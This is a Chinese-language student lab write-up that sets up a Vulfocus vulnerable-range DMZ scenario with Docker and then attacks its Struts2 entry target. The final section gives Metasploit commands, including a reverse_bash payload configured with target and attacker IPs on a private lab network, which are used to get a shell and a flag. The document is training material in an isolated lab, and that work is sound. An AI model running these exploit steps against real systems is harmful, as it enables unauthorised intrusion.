# 网安实践实验一

---

## 环境配置：安装docker

通过述一系列命令实现：

```bash
#将软件源信息写入list文件，使 APT 可以从这个源安装 Docker 相关软件
echo "deb [arch=amd64 signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian bookworm stable" | \
sudo tee /etc/apt/sources.list.d/docker.list 

#使用 curl 命令下载 Docker 官方的 GPG 公钥，将GPG 公钥从文本格式转换为二进制格式，用以验证 Docker 软件包的签名，确保软件包来源可信
  curl -fsSL https://download.docker.com/linux/debian/gpg |
  sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg

#安装 Docker 及相关组件
  sudo apt update
  sudo apt install -y docker-ce docker-ce-cli containerd.io
```

成功安装后docker的版本信息应该如下所示(2025年3月)：

![](./img/docker版本信息.png)

---

## Vulfocus搭建




## 



## 



##



##



##



##



## DMZ环境搭建

在之前成功运行的Vulfocus的基础上进行操作
### 网卡创建
首先根据下面的步骤依次建立两个网卡,网卡的名称任意，子网和网关不和虚拟机网卡重复即可

![](./img/添加网卡操作.png)

### DMZ场景编排

由于直接导入场景编排的压缩包失败，所以需要手动去编排一个场景，这里可以参考原先的场景编排压缩包中的内容进行操作，对`DMZ.zip`解压后可以发现，其中包含了去创建一个场景所需的所有信息，包括网卡信息和镜像配置等信息

可以直接通过对`raw-content.json`这个文件格式化查看，也可以通过`jq`和`grep`查找需要的内容。

首先确定需要的镜像有哪些：

```bash
cat raw-content.json | jq . | grep image_name
```

即查看文件中与`image_name`相关的内容有哪些：

![](./img/dmz安装镜像.png)

可知需要安装是三个不同的镜像文件：
```
vulshare/nginx-php-flag:latest
vulfocus/struts2-cve_2020_17530:latest
vulfocus/weblogic-cve_2019_2725:latest
```
其中第一个镜像存在运行问题，需要替换为:
```
c4pr1c3/vulshare_nginx-php-flag
```

这里有两种安装的方法：

* 第一种是通过Vulfocus的GUI界面安装，它会直接调用`docker pull`拉取镜像
* 第二种事直接手动在命令行执行`docker pull`拉取镜像，然后再通过Vulfocus的GUI界面将本地镜像添加进取

完成镜像拉取后，可以在下面的页面进行编排，详情如下：

![](./img/dmz场景编排.png)

完成场景编排后发布场景并在场景模块中启动场景

![](./img/DMZ启动场景.png)

### 流量捕获配置

在启动了场景之后，可以通过下面的命令开启对`struts2-cve_2020_17530`的流量捕获
```bash
container_name="<替换为目标容器名称或ID>"
docker run --rm --net=container:${container_name} -v ${PWD}/tcpdump/${container_name}:/tcpdump kaazing/tcpdump
```

该命令在当前路径下创建了一个`tcpdump`目录，并且将对指定容器监控的流量捕获到目录中

## DMZ 入口靶标

入口靶标页面如下，记录目标ip和端口号

![](./img/入口靶标.png)
 
进入攻击机，更新并初始化`metasploit`

```bash
sudo apt install -y metasploit-framework
sudo msfdb init
```
检查数据库连接情况并创建工作区准备攻击：

![](./img/检查状态与创建工作目录.png)

由于已经知道了漏洞为`struts2代码执行漏洞`，所以进行相关搜索搜索：
```bash
search struts2 type:exploit
search S2-059 type:exploit
```
使用`info`可以指定序号或名称查看详情
```bash
info 0
```
使用`use`可以使用指定的exp
```bash
use 0
```
使用`show options`可以查看exp的详细参数配置,使用`show payloads`可以查看可用 exp payloads：

```bash
show options
show payloads
```

![](./img/查看payload.png)

选择一个需要的`payload`使用并根据参数列表的内容修改靶机和攻击机的参数

```bash
set payload payload/cmd/unix/reverse_bash   #设置payload
set RHOSTS 192.168.131.10   #靶机IP
set rport  30947    #靶机目标端口    
set LHOST  192.168.131.6   #攻击者主机IP 
```

检查配置的参数,发现已经得到修改：

![](./img/检查参数设置.png)

执行攻击，如果攻击成功，按照payload的内容可以获得靶机的shell:
```bash
run -j 
```

![](./img/靶口获得shell.png)

使用`sessions`命令查看列表，打开`shell`执行命令
```bash
sessions -l
sessions -i 2
```

![](./img/攻破靶口.png)


得到flag

## 


